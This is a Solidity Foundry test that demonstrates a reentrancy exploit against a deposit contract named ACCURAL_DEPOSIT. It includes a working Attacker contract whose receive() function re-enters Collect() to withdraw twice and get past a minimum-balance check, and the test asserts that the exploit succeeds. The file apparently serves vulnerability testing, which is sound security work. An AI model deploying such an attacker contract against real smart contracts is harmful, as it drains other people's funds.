
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {ACCURAL_DEPOSIT, LogFile} from "../src/ACCURAL_DEPOSIT.sol";

contract TestReentrancyACCURAL_DEPOSIT is Test {
    
    ACCURAL_DEPOSIT public _contractUnderTest;
    LogFile public _logFile;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new ACCURAL_DEPOSIT();
        _logFile = new LogFile();
        
        // Point the victim to a valid LogFile to ensure calls don't fail unexpectedly
        _contractUnderTest.SetLogFile(address(_logFile));
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        // We need attackVal to be significant enough to test, but small enough to avoid overflows when doubled.
        // We set MinSum to 2 * attackVal. The exploit allows withdrawing the second half which should be locked.
        vm.assume(attackVal > 0.1 ether && attackVal < 1000 ether);
        uint256 minSum = attackVal * 2;

        // --- 2. State Configuration (Pre-Condition) ---
        // Set the MinSum to exactly double the attack value.
        // Normally, after withdrawing attackVal, the remaining balance (attackVal) would be < MinSum (2*attackVal),
        // preventing the second withdrawal. Reentrancy bypasses this check.
        _contractUnderTest.SetMinSum(minSum);

        // --- 3. Funding ---
        // Fund the test contract so it can pass value to the attacker setup
        vm.deal(address(this), minSum);

        // --- 4. Trigger Attack ---
        // Attacker deposits 'minSum' (2 * attackVal)
        _attacker.setupAttack{value: minSum}(minSum);
        
        // Attacker tries to withdraw 'attackVal' twice via reentrancy
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}

    fallback() external payable {}
}

contract Attacker {
    ACCURAL_DEPOSIT public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public withdrawAmount;

    constructor(address victimAddress) { 
        victim = ACCURAL_DEPOSIT(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        // Deposit the funds required to start the attack
        victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        withdrawAmount = val;
        attackCallCount = 0;
        
        uint256 initialBalance = address(this).balance;

        // Call the vulnerable function
        victim.Collect(val);

        // Verify Success Conditions:
        // We expect to have withdrawn 'val' twice.
        // Initial balance was 0 (after deposit). Current should be 2 * val.
        if (address(this).balance >= initialBalance + (val * 2)) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 1) {            
            attackCallCount++;
            // Re-enter the contract. 
            // At this point, the victim's balance state has not been updated, 
            // so the check (balance >= MinSum) passes again.
            victim.Collect(withdrawAmount);
        }
    }

    fallback() external payable {}
}
